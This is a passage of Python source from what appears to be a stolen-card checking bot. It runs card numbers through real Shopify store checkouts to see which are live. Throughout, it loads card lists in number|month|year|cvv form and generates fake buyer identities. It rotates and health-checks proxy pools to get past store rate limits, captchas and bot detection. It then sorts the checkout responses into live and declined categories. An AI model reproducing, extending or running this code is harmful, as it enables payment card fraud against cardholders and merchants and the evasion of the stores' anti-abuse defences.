                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                line = line.split("#")[0].strip().lower()
                if not line:
                    continue
                if not line.startswith("http"):
                    line = "https://" + line
                out.add(line.rstrip("/"))
    except Exception:
        out = set()
    _skip_sites_cache = out
    _skip_sites_at = now
    return out


def _is_skipped(site: str) -> bool:
    """This shop is not asked at all."""
    if not site:
        return False
    low = str(site).strip().lower().rstrip("/")
    if not low:
        return False
    if not low.startswith("http"):
        low = "https://" + low
    skip = _load_skip_sites()
    if low in skip:
        return True
    # the name of the shop is enough: the shop of that name is the
    # same shop whatever door it is asked through
    host = low.split("//", 1)[-1].split("/", 1)[0]
    for one in skip:
        if one.split("//", 1)[-1].split("/", 1)[0] == host:
            return True
    return False


# A store that refuses the checkout (Cloudflare rate limit, a busy shop)
# is put aside for a while instead of being asked again and again.
# Asking a throttled store only wastes the card's time: the traffic
# belongs to the stores that still answer.
_store_cooldown: dict[str, float] = defaultdict(float)
_store_fails: dict[str, int] = defaultdict(int)
STORE_COOLDOWN = float(os.environ.get("STORE_COOLDOWN", 45))
STORE_COOLDOWN_MAX = float(os.environ.get("STORE_COOLDOWN_MAX", 300))


# The native gate of the project: the card is put into a real shop in
# the way the shop expects, and the answer of the shop about the card
# is given.  It is used when the shop is busy with its own things, for
# then the card was never judged.
# The words of a shop that is busy with its own things: it waits for
# its terms, its tax moved, its goods are not published here, it has
# nothing under the price, or it wants a pickup point.  None of them is
# a word about the card, for the card was never judged.
_SHOP_BUSY = (
    "SITE_ERROR", "PRICE_OVER_MAX", "NO_PRODUCT", "THROTTLED", "TIMEOUT",
    "CART_FAILED", "NO_SESSION_TOKEN", "WAITING_PENDING_TERMS",
    "PENDING_TERMS", "TAX_NEW_TAX", "REQUIRED_ARTIFACTS", "MERCHANDISE_",
    "UNACCEPTABLE_PAYMENT_AMOUNT", "TOTAL_AMOUNT", "PAYMENTS_",
    "SITE_REQUIRES_LOGIN", "SUBMIT_FAILED", "TOKENIZATION_FAILED",
    "NO_ATTEMPT_TOKEN", "CHECKPOINTDENIED", "GRAPHQL_ERROR",
    "NO_PAYMENT_REQUIRED", "CART_ERROR", "NO_SHOPIFY_PAYMENTS_GATEWAY",
    "DELIVERY_", "BUYER_IDENTITY_", "VALIDATION_", "NO_PRODUCT",
)


def _the_shop_is_busy(answer) -> bool:
    """The shop is busy with its own things, so the card was never
    judged."""
    text = str((answer or {}).get("Response") or "")
    text += " " + str((answer or {}).get("Message") or "")
    up = text.upper()
    return any(word in up for word in _SHOP_BUSY)


def _the_native_gate():
    """The native gate, found by its own name."""
    try:
        import os as _os
        import sys as _sys
        here = _os.path.dirname(_os.path.abspath(__file__))
        bot = _os.path.dirname(here)            # .../hitchk-app/bot
        for p in (bot, _os.path.dirname(bot)):   # .../hitchk-app
            if p not in _sys.path:
                _sys.path.insert(0, p)
        from gates.shopify_native_gate import check_card_native
        return check_card_native
    except Exception as e:
        log.warning("the native gate is not there: %s", str(e)[:80])
        return None


async def _ask_the_native_way(cc, month, year, cvv, proxy=None):
    """The card is asked of a real shop in the native way."""
    check = _the_native_gate()
    if not check:
        return None
    try:
        # The native gate has a book of addresses of its own and knows
        # which of them answer, so it is left to choose for itself.
        out = await check(cc, month, year, cvv, site_url=None)
    except Exception as e:
        log.warning("the native way could not be used: %s", str(e)[:80])
        return None
    if not out:
        return None
    resp = str(out.get("Response") or "UNKNOWN")
    return {
        "Response": resp,
        "Message": str(out.get("Message") or "")[:200],
        "Gateway": out.get("Gateway") or "Shopify Native",
        "Price": out.get("Price"),
        "Site": out.get("Site") or "",
        "Product": out.get("Product") or "",
        "Charged": out.get("Charged"),
        "Status": out.get("Status"),
        "Approved": out.get("Approved"),
        "Proxy": out.get("Proxy") or "",
        "Time": out.get("Time") or "",
        "CC": "%s|%s|%s|%s" % (cc, month, year, cvv),
        "code": resp.split(":", 1)[0].strip().upper(),
        "decline_code": "",
    }


def _host_of(site: str) -> str:
    s = site if site.startswith("http") else f"https://{site}"
    return urlparse(s).netloc


def _store_penalise(site: str, seconds: float = 0.0) -> None:
    """Put a store aside for a while."""
    host = _host_of(site)
    _store_fails[host] += 1
    mult = min(1.0 + (_store_fails[host] - 1) * 0.5, 6.0)
    wait = min(max(seconds, STORE_COOLDOWN * mult), STORE_COOLDOWN_MAX)
    _store_cooldown[host] = time.time() + wait


def _store_pardon(site: str) -> None:
    """The store answered, so it is in the clear again."""
    _store_fails[_host_of(site)] = 0
    _store_cooldown.pop(_host_of(site), None)


def _stores_ready(sites: list[str]) -> list[str]:
    """The stores that are not in a cooldown.

    If every store is cooling down, all of them are used: a slow store
    still beats no store at all.
    """
    ready = [s for s in sites
             if time.time() >= _store_cooldown.get(_host_of(s), 0.0)]
    return ready if ready else list(sites)


# The stores rate limit the VPS address, so a check has to come from
# somewhere else.  Every proxy in the pool has its own exit address, so
# the checkers spread over them instead of hammering one.
# How many shops one card tries before it gives the card back.  The
# shops take turns, so the next card starts further along.
SITE_TRIES_PER_CARD = int(os.environ.get("SITE_TRIES_PER_CARD", 12))

# How long one shop and one address may hold a card.
ATTEMPT_SECONDS = float(os.environ.get("ATTEMPT_SECONDS", 34))

# How long a card waits for its place in a shop's queue.  This wait is
# not the card's time: the card's own time starts when the shop takes
# it.
SHOP_QUEUE_WAIT = float(os.environ.get("SHOP_QUEUE_WAIT", 20.0))

# How many attempts one card may make in total.  A card that is going
# nowhere is answered with what it has and the next card gets a turn.
CARD_ATTEMPT_BUDGET = int(os.environ.get("CARD_ATTEMPT_BUDGET", "14") or 14)

# How many addresses one shop is asked from.  A shop that is slow, or
# that puts up a challenge, is saying that about one address and not
# about the card, so the check is made again from the next address
# before the shop is given up on.
ADDRESSES_PER_STORE = int(os.environ.get("ADDRESSES_PER_STORE", 3))

# The answers that are about the address and not about the card.
ADDRESS_PROBLEMS = (
    "THROTTLED", "PROXY_ERROR", "TIMEOUT", "NO_SESSION_TOKEN",
    "CAPTCHA_REQUIRED", "CHECKPOINTDENIED", "NO_ATTEMPT_TOKEN",
)

# How often a shop gave a card answer.  The shops that answer go first.
_store_wins: dict[str, int] = defaultdict(int)

# A shop that puts up a challenge is saying it about one address and
# not about the card.  The address is put aside for that shop, so the
# next card leaves from somewhere else.  The pause is short: the
# address is good again after a little while.
_address_block: dict[tuple, float] = {}
ADDRESS_BLOCK_SECONDS = float(os.environ.get("ADDRESS_BLOCK_SECONDS", 120))

# The pairs of a shop and an address that gave a card answer.  They go
# first, so a card does not have to find its way through the pairs that
# do not work.
_pair_wins: dict[tuple, int] = defaultdict(int)

# The shops whose order comes out over the cap.  The item is inside the
# band but the shipping is not, so the shop cannot make this order at
# this price and every card would waste its time there.
_band_block: dict[tuple, float] = {}


# The providers of the places, and the ones that are tired.
#
# The places come from a handful of providers, and one provider is a
# third of them.  When that provider is tired, all of its places are
# tired with it, and the run feels it hard: it was not one place that
# said no, it was a dozen.  So the provider is remembered as well as
# the place.
_provider_block: dict[str, float] = {}
PROVIDER_BLOCK_SECONDS = float(os.environ.get("PROVIDER_BLOCK_SECONDS", 300))


def _the_provider_of(address: str) -> str:
    """The provider of a place: the host it comes from.

    The password and the port are of no account: it is the host that
    says yes or no for all of them.
    """
    raw = str(address or "").split("@")[-1]
    host = raw.split(":")[0].strip().lower()
    if not host:
        return ""
    bits = host.split(".")
    if len(bits) >= 2 and not bits[0].isdigit():
        return ".".join(bits[-2:])
    return host

# The stores that ask for a captcha, and how long they are left alone.
_captcha_block: dict[str, float] = {}
CAPTCHA_BLOCK_SECONDS = float(os.environ.get("CAPTCHA_BLOCK_SECONDS", 1800))
BAND_BLOCK_SECONDS = float(os.environ.get("BAND_BLOCK_SECONDS", 3600))

_proxy_pool: list[str] = []
_proxy_pool_at: float = 0.0
PROXY_POOL_TTL = float(os.environ.get("PROXY_POOL_TTL", 300))
PROXY_POOL_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                               "proxies.txt")
BOT_PROXY_FILE = os.environ.get(
    "BOT_PROXY_FILE", "/root/hitchecker/hitchk-app/bot/user_proxies.json")


def _load_proxy_pool() -> list[str]:
    """Every proxy the bot holds, for the validator to use."""
    global _proxy_pool, _proxy_pool_at
    now = time.time()
    if _proxy_pool and (now - _proxy_pool_at) < PROXY_POOL_TTL:
        return _proxy_pool
    out: list[str] = []
    # The places the user keeps are the pool.  They are the ones the
    # user has, and the ones the user means.  The api's own file is
    # only looked at when the user has none, because a place that is
    # not wanted any more is worse than no place at all: it is asked,
    # and it says no.
    try:
        with open(BOT_PROXY_FILE) as f:
            data = json.load(f)
        for entry in data.values():
            if not isinstance(entry, dict):
                continue
            for raw in (entry.get("proxies") or []):
                raw = str(raw).strip()
                if raw and raw not in out:
                    out.append(raw)
    except Exception:
        pass
    if not out:
        try:
            with open(PROXY_POOL_FILE) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        out.append(line)
        except Exception:
            pass
    # The addresses the bot holds are added as well.  The bot sends them
    # with every check, and an address that is not in the pool is never
    # tested, so a dead one would cost a check every single time.
    try:
        with open(BOT_PROXY_FILE) as f:
            data = json.load(f)
        for entry in data.values():
            if not isinstance(entry, dict):
                continue
            for raw in (entry.get("proxies") or []):
                raw = str(raw).strip()
                if raw and raw not in out:
                    out.append(raw)
    except Exception:
        pass
    if not out:
        try:
            with open(BOT_PROXY_FILE) as f:
                data = orjson.loads(f.read())
            for u in data.values():
                for p in (u.get("proxies") or []):
                    if p and p not in out:
                        out.append(p)
        except Exception:
            pass
    _proxy_pool = out
    _proxy_pool_at = now
    return out


_proxy_healthy: list[str] = []
_proxy_healthy_at: float = 0.0

# How fast each address answers, in seconds.  The addresses answer at
# anything from a fifth of a second to ten seconds, and a slow one
# turns a four second check into a minute: the check makes a few
# calls and each one waits for the address.  So the fast ones are used
# first.
_proxy_speed: dict[str, float] = {}

# An address that answers within this many seconds is a quick one.
PROXY_FAST_SECONDS = float(os.environ.get("PROXY_FAST_SECONDS", 3.0))

# Which address is used next, so no one address carries every card.
_proxy_turn = 0
# Which proxies answer, by their raw text.  A dead proxy would cost the
# whole check, so it is never used.
_proxy_health: dict[str, bool] = {}
PROXY_HEALTH_TTL = float(os.environ.get("PROXY_HEALTH_TTL", 600))


async def _check_proxies(pool: list[str], timeout=6) -> list[str]:
    """The proxies that answer.

    A dead proxy would cost the whole check (the timeout is longer than
    any checkout), so they are tested once and the dead ones dropped.
    """
    import aiohttp
    good: list[str] = []

    async def probe(raw: str):
        p = _parse_proxy(raw)
        if not p:
            return None
        try:
            started = time.time()
            async with aiohttp.ClientSession() as s:
                async with s.get("https://api.ipify.org?format=json",
                                 proxy=p,
                                 timeout=aiohttp.ClientTimeout(total=timeout)) as r:
                    ok = r.status == 200
                    # The key is the FORMATTED proxy, so the pool (which
                    # holds the raw text) and the lists the bot sends
                    # (already formatted) talk about the same proxy.
                    _proxy_health[p] = ok
                    if ok:
                        elapsed = time.time() - started
                        # The pool holds the raw text and the lists the
                        # bot sends hold the full address, so the speed
                        # is remembered under both.
                        _proxy_speed[p] = elapsed
                        _proxy_speed[raw] = elapsed
                    return p if ok else None
        except Exception:
            _proxy_health[p] = False
            return None

    for i in range(0, len(pool), 30):
        chunk = pool[i:i + 30]
        res = await asyncio.gather(*[probe(p) for p in chunk])
        good.extend([p for p in res if p])
    # the pool keeps the raw text, the health map the formatted one
    return [p for p in pool if _proxy_health.get(_parse_proxy(p) or "", False)]


async def _warm_the_shops():
    """The shops are asked for their goods while the service starts.

    Without this the first cards of a run all wait for the same goods
    to be fetched, one after the other, and the run crawls: the fetch
    of a shop holds that shop, and every card that wants that shop
    waits for it.
    """
    sites = _load_sites_from_file()
    # the shops that are not asked at all are taken out
    _skip = _load_skip_sites()
    if _skip:
        sites = [s for s in sites if not _is_skipped(s)]
    if not sites:
        return

    async def one(site):
        # An address from the pool, so the shops are not tired of this
        # place before the first card arrives.
        address = _pick_pool_proxy()
        try:
            await _fetch_products("https://" + site, address, MAX_PRICE)
        except Exception:
            pass

    # a few at a time: the shops are asked, not flooded
    for i in range(0, len(sites), 4):
        await asyncio.gather(*[one(s) for s in sites[i:i + 4]], return_exceptions=True)


async def _healthy_pool() -> list[str]:
    """The pool, with the dead proxies taken out."""
    global _proxy_healthy, _proxy_healthy_at
    pool = _load_proxy_pool()
    if not pool:
        return []
    now = time.time()
    if _proxy_healthy and (now - _proxy_healthy_at) < PROXY_HEALTH_TTL:
        return _proxy_healthy
    healthy = await _check_proxies(pool)
    if healthy:
        # the quick addresses first
        healthy = sorted(healthy, key=lambda p: _proxy_speed.get(p, 99.0))
        _proxy_healthy = healthy
        _proxy_healthy_at = now
        quick = len([p for p in healthy if _proxy_speed.get(p, 99.0) <= PROXY_FAST_SECONDS])
        log.warning("proxy pool: %d of %d answer, %d of them quick", len(healthy), len(pool), quick)
        return healthy
    return pool


def _pick_rescue_proxy(raw: Optional[str]) -> Optional[str]:
    """A proxy to use when the store is rate limiting us.

    The list the caller passed comes first, then the pool.  The proxies
    that are known to be dead are left out.
    """
    if raw:
        choices = [p.strip() for p in raw.split(",") if p.strip()]
        good = []
        for p in choices:
            form = _parse_proxy(p) or p
            if _proxy_health.get(form, True):
                good.append(form)
        if good:
            return random.choice(good)
    pool = _proxy_healthy or _load_proxy_pool()
    healthy = [p for p in pool if _proxy_health.get(_parse_proxy(p) or "", True)]
    if healthy:
        # the quick ones first: a slow one would cost the check
        quick = [p for p in healthy if _proxy_speed.get(_parse_proxy(p) or p, 99.0) <= PROXY_FAST_SECONDS]
        return random.choice(quick or healthy)
    return _pick_pool_proxy()


def _pick_pool_proxy() -> Optional[str]:
    """One proxy from the pool, or nothing when there is no pool.

    The quick addresses are used, and they take turns, so no one address
    carries every card and no one shop sees every card from the same
    place.
    """
    global _proxy_turn
    pool = _proxy_healthy or _load_proxy_pool()
    if not pool:
        return None
    quick = [p for p in pool if _proxy_speed.get(p, 99.0) <= PROXY_FAST_SECONDS]
    usable = quick or pool
    if len(usable) > 1:
        idx = _proxy_turn % len(usable)
        _proxy_turn += 1
        return usable[idx]
    return usable[0]


def _load_sites_from_file() -> list[str]:
    """Merchants the API falls back on when the caller names no site."""
    global _sites_cache, _sites_loaded_at
    if _sites_cache and (time.time() - _sites_loaded_at) < 300:
        return _sites_cache
    out: list[str] = []
    path = SITES_FILE
    if not os.path.isabs(path):
        path = os.path.join(os.path.dirname(os.path.abspath(__file__)), path)
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as fh:
            for line in fh:
                s = line.strip()
                if s and not s.startswith("#") and "." in s:
                    s = s.replace("https://", "").replace("http://", "").strip("/")
                    if s not in out:
                        out.append(s)
    except Exception:
        pass
    # The shops that are not asked at all are taken out here, so that
    # every caller of the pool is without them.
    _skip = _load_skip_sites()
    if _skip:
        out = [s for s in out if not _is_skipped(s)]
    _sites_cache = out
    _sites_loaded_at = time.time()
    return out


def _reload_cards() -> None:
    global _cards_cache, _cards_loaded_at
    _cards_cache  = _load_cards_from_file()
    _cards_loaded_at = time.time()


def _load_cards_from_file() -> list[dict]:
    cards = []
    if not os.path.exists(CARDS_FILE):
        return cards
    with open(CARDS_FILE, "r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            card = _parse_card(line.strip())
            if card:
                cards.append(card)
    return cards


def _get_cards() -> list[dict]:
    global _cards_cache, _cards_loaded_at
    if not _cards_cache or (time.time() - _cards_loaded_at) > 120:
        _reload_cards()
    return _cards_cache


def _parse_card(raw: str) -> Optional[dict]:
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None
    parts = raw.replace(" ", "").split("|")
    if len(parts) != 4:
        return None
    cc_num, mon, yr, cvv = [p.strip() for p in parts]
    # The country is sometimes written after the card.  It is not part
    # of the card, and a card refused for that reason never reached the
    # bank.
    cvv = re.split(r"[^0-9]", cvv)[0]
    if not (cc_num.isdigit() and mon.isdigit() and yr.isdigit() and cvv.isdigit()):
        return None
    if len(yr) == 4:
        yr = yr[2:]
    if len(yr) != 2:
        return None
    if not 1 <= int(mon) <= 12:
        return None
    if len(cc_num) < 13 or len(cc_num) > 19:
        return None
    return {"cc": cc_num, "month": mon, "year": yr, "cvv": cvv}


def _parse_proxy(raw: Optional[str]) -> Optional[str]:
    if not raw:
        return None
    s = raw.strip()
    if not s:
        return None
    if "://" in s:
        return s
    if "@" in s and ":" in s:
        return f"http://{s}"
    parts_ws = s.split()
    if len(parts_ws) == 4:
        user, pwd, host, port = parts_ws
        return f"http://{user}:{pwd}@{host}:{port}"
    parts = s.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    return None


def _parse_proxy_any(raw: Optional[str]) -> Optional[str]:
    """A proxy, or one picked from a list of them.

    A caller may hand in several proxies separated by commas; each check
    then leaves from a different address, which is what keeps the stores
    from refusing the checkout.
    """
    if not raw:
        return None
    raw = raw.strip()
    if "," in raw:
        choices = [p.strip() for p in raw.split(",") if p.strip()]
        if not choices:
            return None
        # The proxies that are known to be dead are left out: one of
        # them would cost the whole check.  The book of dead addresses
        # is written with the full address, so the address is put in
        # that form before it is looked up.
        good = []
        for p in choices:
            form = _parse_proxy(p) or p
            if _proxy_health.get(form, True):
                good.append(form)
        if not good:
            good = [_parse_proxy(p) or p for p in choices]
        return random.choice(good)
    form = _parse_proxy(raw) or raw
    if _proxy_health.get(form) is False:
        return None
    return form


def _pick_address(url: str, currency: Optional[str] = None) -> dict:
    netloc = urlparse(url).netloc.split(":")[0]
    tld    = netloc.split(".")[-1].upper()
    if tld in ADDRESS_BOOK:
        return ADDRESS_BOOK[tld]
    if currency:
        cc = C2C.get(currency.upper())
        if cc and cc in ADDRESS_BOOK:
            return ADDRESS_BOOK[cc]
    return ADDRESS_BOOK["DEFAULT"]


def _random_identity() -> tuple[str, str, str]:
    first = random.choice(FIRST_NAMES)
    last  = random.choice(LAST_NAMES)
    email = f"{first.lower()}.{last.lower()}{random.randint(1,9999)}@{random.choice(EMAIL_DOMAINS)}"
    return first, last, email


def _extract(text: str, start: str, end: str) -> Optional[str]:
    idx = text.find(start)
    if idx == -1:
        return None
    sub     = text[idx + len(start):]
    end_idx = sub.find(end)
    if end_idx == -1:
        return None
    val = sub[:end_idx]
    return val if val else None


def _extract_sst(text: str, headers: dict) -> Optional[str]:
    for key in ("X-Checkout-One-Session-Token", "x-checkout-one-session-token"):
        if key in headers:
            return headers[key]
    patterns = [
        ('name="serialized-sessionToken" content="&quot;', "&quot;"),
        ('name="serialized-sessionToken" content="', '"'),
        ('"serializedSessionToken":"',   '"'),
        ('"sessionToken":"',             '"'),
        ("sessionToken&quot;:&quot;",   "&quot;"),
        ('data-session-token="',         '"'),
        ('"checkout_session_token":"',   '"'),
    ]
    for s, e in patterns:
        val = _extract(text, s, e)
        if val and len(val) > 10:
            return val
    return None


# The words of the shop about itself: a delivery that changed, a price
# that moved, a token that ran out.  They are the shop's own fault and
# not a word about the card, and they are marked as such so that a card
# that was never judged is not told that it was refused.
_SHOP_SIDE = (
    "DELIVERY_", "PRICE_", "PRODUCT_", "CART_", "CHECKOUT_", "LINE_",
    "VARIANT_", "MERCHANT_", "TAX_", "SHIPPING_", "LOCATION_",
    "ADDRESS_", "TOKEN_", "SESSION_", "ATTEMPT_", "ORDER_CREATION_",
    "NO_", "INCOMPLETE_", "UNSUPPORTED_", "REQUIRED_", "INVALID_SESSION",
    # the terms of the payment of that shop do not fit the order, which
    # is the shop's own business and not a word about the card.  The
    # words of the card are not of this kind: the card that has run
    # out is "PAYMENTS_CREDIT_CARD_BASE_EXPIRED".
    "PAYMENTS_PAYMENT_FLEXIBILITY", "PAYMENTS_PAYMENT_METHOD",
    # the shop is waiting for its own terms, which is its own business
    "WAITING", "PENDING_TERMS", "TERMS_",
)


def _is_shop_side(text) -> bool:
    """The shop is talking about itself, and not about the card."""
    up = str(text or "").upper()
    return any(up.startswith(k) for k in _SHOP_SIDE)


def _normalize_response(raw: Optional[str]) -> str:
    if not raw:
        return "CARD_DECLINED"
    msg = str(raw).upper()

    # the shop's own words about itself
    if _is_shop_side(msg):
        return "SITE_ERROR: " + msg[:100]

    if any(k in msg for k in ("ORDER_PLACED", "PROCESSEDRECEIPT", "PAYMENT_COMPLETE", "ORDER_CREATED")):
        return "ORDER_PLACED"
    if any(k in msg for k in ("ACTION_REQUIRED", "ACTIONREQUIRED", "3DS", "OTP",
                               "REDIRECT_TO_3DS", "COMPLETE_PAYMENT", "CHALLENGE",
                               "AUTHENTICATION_REQUIRED", "THREEDSSECURE",
                               "THREE_D_SECURE", "3D_SECURE", "SCA_REQUIRED")):
        return "3DS_REQUIRED"
    if any(k in msg for k in ("INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE",
                               "SECURITY_CODE", "CVV_FAILURE", "INCORRECT_CVC",
                               "CVC_CHECK_FAILED", "CVV_CHECK_FAILED")):
        return "INVALID_CVC"
    if any(k in msg for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT", "DO_NOT_HONOR",
                               "NOT_SUFFICIENT_FUNDS", "EXCEEDS_BALANCE")):
        return "INSUFFICIENT_FUNDS"
    if any(k in msg for k in ("EXPIRED", "EXPIRY", "INVALID_EXPIRY", "EXPIRATION",
                               "BASE_EXPIRED", "CARD_EXPIRED", "PAYMENTS_CREDIT_CARD_BASE_EXPIRED")):
        return "EXPIRED_CARD"
    if any(k in msg for k in ("INVALID_NUMBER", "NO_SUCH_ISSUER", "INVALID_CARD",
                               "INCORRECT_NUMBER", "BAD_NUMBER", "INVALID_ACCOUNT",
                               "CARD_NOT_SUPPORTED")):
        return "INVALID_CARD"
    if any(k in msg for k in ("LOST", "STOLEN", "PICKUP", "RESTRICTED", "REVOCATION")):
        return "CARD_DECLINED"
    if any(k in msg for k in ("CALL_ISSUER", "REFER_TO_ISSUER", "CONTACT_ISSUER")):
        return "CARD_DECLINED"
    if any(k in msg for k in ("GENERIC_DECLINE", "TRANSACTION_NOT_ALLOWED",
                               "NOT_PERMITTED", "SERVICE_NOT_ALLOWED",
                               "TRY_AGAIN_LATER", "LIMIT_EXCEEDED")):
        return "CARD_DECLINED"
    if any(k in msg for k in ("CAPTCHA", "RECAPTCHA", "HCAPTCHA", "BOT_DETECTION", "CHALLENGE_REQUIRED")):
        return "CAPTCHA_REQUIRED"
    return "CARD_DECLINED"


def _parse_gql_errors(errors: list) -> str:
    for err in errors:
        for field in ("code", "nonLocalizedMessage", "localizedMessage",
                      "message", "localizedMessageHtml", "messageUntranslated"):
            raw = str(err.get(field) or "")
            if not raw:
                continue
            norm = _normalize_response(raw)
            if norm != "CARD_DECLINED":
                return norm
            upper = raw.upper()
            if any(k in upper for k in ("CAPTCHA", "RECAPTCHA", "HCAPTCHA", "BOT_DETECTION", "CHALLENGE_REQUIRED")):
                return "CAPTCHA_REQUIRED"
            if any(k in upper for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT", "EXCEEDS_BALANCE")):
                return "INSUFFICIENT_FUNDS"
            if any(k in upper for k in ("BASE_EXPIRED", "CARD_EXPIRED", "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
                                        "EXPIRED_CARD", "INVALID_EXPIRY")):
                return "EXPIRED_CARD"
            if any(k in upper for k in ("INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE", "CVV_FAILURE", "INCORRECT_CVC")):
                return "INVALID_CVC"
            if any(k in upper for k in ("PAYMENT_DECLINED", "CARD_DECLINED",
                                         "CHARGE_DECLINED", "CARD_WAS_DECLINED",
                                         "FRAUD")):
                return "CARD_DECLINED"
            if any(k in upper for k in ("CHECKOUT_ALREADY_COMPLETED", "ALREADY_ACCEPTED")):
                return "CARD_DECLINED"
            if any(k in upper for k in ("SESSION_EXPIRED", "SESSION_INVALID",
                                         "TOKEN_EXPIRED", "INVALID_SESSION")):
                return "SESSION_EXPIRED"
            if any(k in upper for k in ("LOGIN_REQUIRED", "ACCOUNT_REQUIRED",
                                         "CUSTOMER_DISABLED")):
                return "SITE_REQUIRES_LOGIN"
            if any(k in upper for k in ("OUT_OF_STOCK", "SOLD_OUT",
                                         "INVENTORY_CLAIM", "INVENTORY_RESERVATION")):
                return "NO_PRODUCT"
            if any(k in upper for k in ("THROTTLED", "RATE_LIMIT", "TOO_MANY_REQUESTS",
                                         "RATE_LIMITED", "RETRY_LATER")):
                return "THROTTLED"
    return "GRAPHQL_ERROR"


@contextlib.asynccontextmanager
async def _the_shop_slot(hostname: str, hold_the_slot: bool):
    """A place in the shop's queue.

    When the caller holds the place already, the shop is not asked for
    it again: a place is taken once, and asking for it twice would
    leave the cards waiting for each other.
    """
    if hold_the_slot:
        yield
        return
    sem = _site_semaphores[hostname]
    await sem.acquire()
    try:
        yield
    finally:
        sem.release()


def _make_session(proxy_str: Optional[str]) -> tuple[LoggedSession, bool]:
    proxy = _parse_proxy_any(proxy_str) if proxy_str else None
    proxies = {"http": proxy, "https": proxy} if proxy else None
    # A request that leaves through an address is given less time.  An
    # address that does not answer should not hold the card.
    timeout = PROXY_REQUEST_TIMEOUT if proxy else REQUEST_TIMEOUT
    session = LoggedSession(AsyncSession(impersonate=IMPERSONATE, timeout=timeout, proxies=proxies))
    return session, True


# ---------------------------------------------------------------------------
# Product fetching with TTL cache
# ---------------------------------------------------------------------------
async def _fetch_products(
    base_url: str,
    proxy_str: Optional[str] = None,
    max_price: float = MAX_PRICE,
) -> tuple[Optional[dict], list[dict], Optional[str]]:
    if not base_url.startswith("http"):
        base_url = "https://" + base_url

    hostname = urlparse(base_url).netloc
    now      = time.time()

    # The cache keeps one entry per store and price band.  A narrow band
    # must not serve its answer to a wide one, and the other way round.
    cache_key = f"{hostname}|{max_price:.2f}"

    cached = _product_cache.get(cache_key)
    if cached and (now - cached["ts"]) < _product_cache_ttl(cached):
        return cached.get("product"), cached.get("candidates", []), cached.get("err")

    # Only one fetch per store at a time; the rest wait for its result.
    # But a card does not wait for ever: if the other fetch is taking
    # too long, the card fetches the goods itself.
    locked = False
    try:
        await asyncio.wait_for(_product_locks[hostname].acquire(),
                               timeout=PRODUCT_LOCK_WAIT)
        locked = True
    except asyncio.TimeoutError:
        locked = False
    try:
        now = time.time()
        cached = _product_cache.get(cache_key)
        if cached and (now - cached["ts"]) < _product_cache_ttl(cached):
            return cached.get("product"), cached.get("candidates", []), cached.get("err")

        return await _fetch_products_locked(base_url, proxy_str, max_price, hostname)
    finally:
        if locked:
            _product_locks[hostname].release()


async def _fetch_products_locked(
    base_url: str,
    proxy_str: Optional[str],
    max_price: float,
    hostname: str,
) -> tuple[Optional[dict], list[dict], Optional[str]]:
    """The actual fetch.  The caller holds the store's lock.

    The product list is a public page, so it is fetched DIRECTLY even
    when the checkout goes through a proxy.  A proxy that cannot reach
    the store would otherwise make every card on that store wait for a
    product list that never arrives.
    """
    now = time.time()
    cache_key = f"{hostname}|{max_price:.2f}"

    session, owned = _make_session(None)

    try:
        all_variants: list[dict] = []
        urls_to_try = [
            f"{base_url}/products.json?limit=250&sort_by=price-ascending",
            f"{base_url}/products.json?limit=250",
        ]
        # The shop is asked from an address first, and from here second.
        # A shop counts the asking per address, and every card asking
        # from the same place is what makes the shop say no.  A shop
        # that says no to one place is asked from another before it is
        # given up on.
        places = [(session, None)]
        other_owned = False
        other_session = None
        if proxy_str:
            try:
                other_session, other_owned = _make_session(proxy_str)
                places.append((other_session, proxy_str))
            except Exception:
                other_session = None
        # and a place from the pool, for when this place is tired
        pool_address = _pick_pool_proxy()
        if pool_address and pool_address != proxy_str:
            try:
                pool_session, pool_owned = _make_session(pool_address)
                places.append((pool_session, pool_address))
            except Exception:
                pool_session = None
                pool_owned = False
        else:
            pool_session = None
            pool_owned = False
        was_throttled = False
        the_shop_is_empty = False
        the_answer_is_not_a_goods_list = False

        try:
            for url in urls_to_try:
                for place, place_address in places:
                    try:
                        resp = await place.get(url, allow_redirects=True)
                    except Exception:
                        continue
                    if resp.status_code == 200:
                        try:
                            data = orjson.loads(resp.content)
                        except Exception:
                            data = None
                        if isinstance(data, dict) and "products" in data:
                            products = data.get("products") or []
                            if products:
                                all_variants = products
                                break
                            # The shop answered and it has nothing to
                            # sell.  That is an answer, and it is kept.
                            the_shop_is_empty = True
                        else:
                            # The answer is not a goods list at all: the
                            # shop has said something else, and the card
                            # is not told the shop sells nothing.  The
                            # place is not punished either: one odd page
                            # is not the place's fault.
                            the_answer_is_not_a_goods_list = True
                        continue
                    elif resp.status_code in (429, 430):
                        # this place is tired, the next one is asked
                        was_throttled = True
                if all_variants:
                    break
            if not all_variants and was_throttled:
                err = "THROTTLED"
                _product_cache[cache_key] = {"product": None, "candidates": [], "err": err,
                                             "throttled": True, "ts": now, "ok": False}
                return None, [], err
            if not all_variants and the_answer_is_not_a_goods_list:
                # The shop did not say it sells nothing: it said
                # something else.  The card is told that, and not that
                # the shop is empty, and the answer is not kept for
                # long, so the next card asks again.
                err = "the goods list could not be read"
                _product_cache[cache_key] = {"product": None, "candidates": [], "err": err,
                                             "ts": now, "ok": False}
                return None, [], err
        finally:
            for one, owned in ((other_session, other_owned),
                               (pool_session, pool_owned)):
                if owned and one is not None:
                    res = one.close()
                    if asyncio.iscoroutine(res):
                        await res

        candidates: list[dict] = []
        add_ons: list[dict] = []
        any_variant: list[dict] = []
        best: Optional[dict] = None
        best_price = float("inf")
        best_add_on: Optional[dict] = None
        best_add_on_price = float("inf")
        cheapest_any: Optional[dict] = None
        cheapest_any_price = float("inf")

        if not all_variants:
            try:
                import xml.etree.ElementTree as ET
                import re as _re
                sitemap_url = f"{base_url}/sitemap_products_1.xml"
                smap_resp = await session.get(sitemap_url, allow_redirects=True)
                if smap_resp.status_code == 200:
